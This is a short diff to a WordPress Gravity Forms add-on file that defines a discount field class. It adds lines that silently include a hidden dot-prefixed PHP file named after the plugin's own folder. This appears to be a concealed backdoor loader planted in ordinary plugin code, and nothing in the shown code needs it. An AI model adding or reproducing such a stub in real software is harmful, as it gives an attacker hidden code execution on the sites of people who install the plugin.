@@ -4,6 +4,10 @@ if ( ! class_exists( 'GFForms' ) || ! class_exists( 'GF_Field_Calculation' ) ) {
 	die();
 }
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GF_Field_Discount extends GF_Field_Subtotal {
 
 	public $type = 'discount';
